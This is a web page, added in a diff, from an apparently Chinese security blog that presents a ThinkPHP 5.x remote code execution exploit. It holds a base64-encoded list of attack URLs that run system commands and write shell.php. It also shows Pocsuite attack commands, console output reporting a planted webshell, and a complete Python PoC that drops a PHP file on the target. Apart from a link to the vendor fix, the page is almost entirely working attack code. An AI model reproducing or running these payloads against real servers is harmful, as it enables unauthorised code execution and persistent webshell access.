@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Thinkphp 5.x &lt; 5.1.31, &lt;= 5.0.23 Remote code Execute</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="0x00-漏洞背景">0x00 漏洞背景</h2>
+<p>近日thinkphp团队发布了版本更新https://blog.thinkphp.cn/869075，其中修复了一处getshell漏洞。</p>
+<ul>
+<li>影响范围：5.x &lt; 5.1.31, &lt;= 5.0.23</li>
+<li>危害：远程代码执行</li>
+</ul>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-11/0x01.png" alt="poc"></p>
+<h2 id="0x01-exploit">0x01 Exploit</h2>
+<p>base64decode =&gt; :</p>
+<pre><code>Lz9zPWluZGV4L1x0aGlua1xSZXF1ZXN0L2lucHV0JmZpbHRlcj1waHBpbmZvJmRhdGE9MQoKLz9zPWluZGV4L1x0aGlua1xSZXF1ZXN0L2lucHV0JmZpbHRlcj1zeXN0ZW0mZGF0YT1pZAoKLz9zPWluZGV4L1x0aGlua1x0ZW1wbGF0ZVxkcml2ZXJcZmlsZS93cml0ZSZjYWNoZUZpbGU9c2hlbGwucGhwJmNvbnRlbnQ9JTNDP3BocCUyMHBocGluZm8oKTs/JTNFCgovP3M9aW5kZXgvXHRoaW5rXHZpZXdcZHJpdmVyXFBocC9kaXNwbGF5JmNvbnRlbnQ9JTNDP3BocCUyMHBocGluZm8oKTs/JTNFCgovP3M9aW5kZXgvXHRoaW5rXGFwcC9pbnZva2VmdW5jdGlvbiZmdW5jdGlvbj1jYWxsX3VzZXJfZnVuY19hcnJheSZ2YXJzWzBdPXBocGluZm8mdmFyc1sxXVtdPTEKCi8/cz1pbmRleC9cdGhpbmtcYXBwL2ludm9rZWZ1bmN0aW9uJmZ1bmN0aW9uPWNhbGxfdXNlcl9mdW5jX2FycmF5JnZhcnNbMF09c3lzdGVtJnZhcnNbMV1bXT1pZAoKLz9zPWluZGV4L1x0aGlua1xDb250YWluZXIvaW52b2tlZnVuY3Rpb24mZnVuY3Rpb249Y2FsbF91c2VyX2Z1bmNfYXJyYXkmdmFyc1swXT1waHBpbmZvJnZhcnNbMV1bXT0xCgovP3M9aW5kZXgvXHRoaW5rXENvbnRhaW5lci9pbnZva2VmdW5jdGlvbiZmdW5jdGlvbj1jYWxsX3VzZXJfZnVuY19hcnJheSZ2YXJzWzBdPXN5c3RlbSZ2YXJzWzFdW109aWQ=
+</code></pre><h2 id="0x02-poc验证脚本-pocsuite">0x02 POC验证脚本-Pocsuite</h2>
+<p>Pocsuite 是由知道创宇404实验室打造的一款开源的远程漏洞测试框架。它是知道创宇安全研究团队发展的基石，是团队发展至今一直维护的一个项目，保障了我们的 Web 安全研究能力的领先。</p>
+<p>你可以直接使用 Pocsuite 进行漏洞的验证与利用；你也可以基于 Pocsuite 进行 PoC/Exp 的开发，因为它也是一个 PoC 开发框架；同时，你还可以在你的漏洞测试工具里直接集成 Pocsuite，它也提供标准的调用类。</p>
+<p>&ndash; pocsuite.org</p>
+<p>我Fork了一份，自己添加了一个插件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/Cooolis/Pocsuite.git
+python pocsuite.py --url http://127.0.0.1:8080/ --verify -r modules/thinkphpv5_rce.py <span style="color:#75715e"># 验证漏洞</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python pocsuite.py --url http://127.0.0.1:8080/ --attack -r modules/thinkphpv5_rce.py <span style="color:#75715e"># 获取webshell</span>
+
+rvn0xsy@Rvn0xsy ~/G/Pocsuite&gt; python pocsuite.py --url http://127.0.0.1:8080/ --attack -r modules/thinkphpv5_rce.py
+
+                              ,--. ,--.
+ ,---. ,---. ,---.,---.,--.,--<span style="color:#e6db74">`</span>--,-<span style="color:#e6db74">&#39;  &#39;</span>-.,---.  <span style="color:#f92672">{</span>2.0.8-df54a3d<span style="color:#f92672">}</span>
+| .-. | .-. | .--<span style="color:#f92672">(</span>  .-<span style="color:#e6db74">&#39;|  ||  ,--&#39;</span>-.  .-| .-. :
+| <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#e6db74">&#39; &#39;</span>-<span style="color:#e6db74">&#39; \ `--.-&#39;</span>  <span style="color:#e6db74">`</span><span style="color:#e6db74">&#39;  &#39;&#39;  |  | |  | \   --.
+</span><span style="color:#e6db74">|  |-&#39;</span> <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `---`----&#39;</span> <span style="color:#e6db74">`</span>----<span style="color:#e6db74">&#39;`--&#39;</span> <span style="color:#e6db74">`</span>--<span style="color:#e6db74">&#39;  `----&#39;</span>
+<span style="color:#e6db74">`</span>--<span style="color:#e6db74">&#39;                                            http://pocsuite.org
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[!] legal disclaimer: Usage of pocsuite for attacking targets without prior mutual consent is illegal.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[*] starting at 21:04:22
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[21:04:22] [*] checking Thinkphp 5.x &lt; 5.1.31, &lt;= 5.0.23 远程代码执行
+</span><span style="color:#e6db74">[21:04:22] [*] poc:&#39;</span>Thinkphp 5.x &lt; 5.1.31, &lt;<span style="color:#f92672">=</span> 5.0.23 远程代码执行<span style="color:#e6db74">&#39; target:&#39;</span>http://127.0.0.1:8080/<span style="color:#960050;background-color:#1e0010">&#39;</span>
+<span style="color:#f92672">[</span>21:04:22<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> webshell : http://127.0.0.1:8080/424.php
++------------------------+----------------+--------+-----------+-------------------------+---------+
+| target-url             |    poc-name    | poc-id | component |         version         |  status |
++------------------------+----------------+--------+-----------+-------------------------+---------+
+| http://127.0.0.1:8080/ | thinkphpv5_rce |  <span style="color:#ae81ff">1024</span>  |  Thinkphp | 5.x &lt; 5.1.31, &lt;<span style="color:#f92672">=</span> 5.0.23 | success |
++------------------------+----------------+--------+-----------+-------------------------+---------+
+success : <span style="color:#ae81ff">1</span> / <span style="color:#ae81ff">1</span>
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> shutting down at 21:04:22
+</code></pre></div><p>可批量验证：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...
+usage: pocsuite <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span>
+
+optional arguments:
+  -h, --help            Show help message and exit
+  --version             Show program<span style="color:#960050;background-color:#1e0010">&#39;</span>s version number and exit
+  --update              Update Pocsuite
+
+target:
+  -u URL, --url URL     Target URL <span style="color:#f92672">(</span>e.g. <span style="color:#e6db74">&#34;http://www.targetsite.com/&#34;</span><span style="color:#f92672">)</span>
+  -f URLFILE, --file URLFILE
+                        Scan multiple targets given in a textual file
+  -r POCFILE            Load POC from a file <span style="color:#f92672">(</span>e.g. <span style="color:#e6db74">&#34;_0001_cms_sql_inj.py&#34;</span><span style="color:#f92672">)</span> or directory <span style="color:#f92672">(</span>e.g. <span style="color:#e6db74">&#34;modules/&#34;</span><span style="color:#f92672">)</span>
+
+mode:
+  --verify              Run poc with verify mode
+  --attack              Run poc with attack mode
+...
+</code></pre></div><h2 id="0x03-poc代码">0x03 POC代码</h2>
+<p><a href="https://github.com/Cooolis/Pocsuite/blob/dev/modules/thinkphpv5_rce.py">https://github.com/Cooolis/Pocsuite/blob/dev/modules/thinkphpv5_rce.py</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># coding: utf-8</span>
+
+<span style="color:#f92672">import</span> urllib
+<span style="color:#f92672">import</span> random
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">from</span> pocsuite.api.request <span style="color:#f92672">import</span> req
+<span style="color:#f92672">from</span> pocsuite.api.poc <span style="color:#f92672">import</span> register
+<span style="color:#f92672">from</span> pocsuite.api.poc <span style="color:#f92672">import</span> Output, POCBase
+<span style="color:#f92672">from</span> collections <span style="color:#f92672">import</span> OrderedDict
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ThinkPHP</span>(POCBase):
+    vulID <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1024&#39;</span>
+    version <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>
+    author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;倾旋 rvn0sxy@gmail.com&#39;</span>
+    vulDate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;2018-12-10&#39;</span>
+    createDate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;2018-12-11&#39;</span>
+    updateDate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;2018-12-11&#39;</span>
+    references <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ&#39;</span>]
+    name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Thinkphp 5.x &lt; 5.1.31, &lt;= 5.0.23 远程代码执行&#39;</span>
+    appPowerLink <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://www.thinkphp.cn/&#39;</span>
+    appName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Thinkphp&#39;</span>
+    appVersion <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;5.x &lt; 5.1.31, &lt;= 5.0.23&#39;</span>
+    vulType <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Remote code Execute&#39;</span>
+    desc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;近日thinkphp团队发布了版本更新https://blog.thinkphp.cn/869075，其中修复了一处getshell漏洞。&#39;</span>
+    samples <span style="color:#f92672">=</span> []
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_attack</span>(self):
+            result <span style="color:#f92672">=</span> {}
+            shell_name <span style="color:#f92672">=</span> str(int(random<span style="color:#f92672">.</span>random() <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.php&#39;</span>
+            shell_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php phpinfo();?&gt;&#39;</span>
+            proxies <span style="color:#f92672">=</span> {
+                <span style="color:#e6db74">&#34;http&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:8081&#34;</span>
+            }
+            vul_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/?s=index/</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">think</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&amp;vars[1][]=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (self<span style="color:#f92672">.</span>url,shell_name,shell_code)
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>_verify(verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
+                <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>parse_attack(result)
+            response <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span>post(vul_url,proxies<span style="color:#f92672">=</span>proxies)
+            <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">and</span> str(len(shell_code)) <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>content:
+                result[<span style="color:#e6db74">&#39;webshell&#39;</span>] <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>url<span style="color:#f92672">+</span>shell_name
+            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>parse_attack(result)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_verify</span>(self,verify<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
+            result <span style="color:#f92672">=</span> {}
+            proxies <span style="color:#f92672">=</span> {
+                <span style="color:#e6db74">&#34;http&#34;</span>:<span style="color:#e6db74">&#34;http://127.0.0.1:8081&#34;</span>
+            }
+            vul_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/?s=index/</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">think</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=header&amp;vars[1][]=vuln:1&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>url
+            response <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span>get(vul_url,proxies<span style="color:#f92672">=</span>proxies)<span style="color:#f92672">.</span>headers
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;vuln&#39;</span> <span style="color:#f92672">in</span> response:
+                result[<span style="color:#e6db74">&#39;VerifyInfo&#39;</span>] <span style="color:#f92672">=</span> {}
+                result[<span style="color:#e6db74">&#39;VerifyInfo&#39;</span>][<span style="color:#e6db74">&#39;URL&#39;</span>] <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>url
+            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>parse_attack(result)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_attack</span>(self, result):
+            output <span style="color:#f92672">=</span> Output(self)
+            <span style="color:#66d9ef">if</span> result:
+                output<span style="color:#f92672">.</span>success(result)
+            <span style="color:#66d9ef">else</span>:
+                output<span style="color:#f92672">.</span>fail(<span style="color:#e6db74">&#34;No ... &#34;</span>)
+            <span style="color:#66d9ef">return</span> output
+
+
+register(ThinkPHP)
+</code></pre></div><p>关于POC的使用，可参考<a href="http://pocsuite.org">pocsuite.org</a></p>
+<h2 id="0x04-修复">0x04 修复</h2>
+<p>参考：<a href="https://blog.thinkphp.cn/869075">https://blog.thinkphp.cn/869075</a></p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
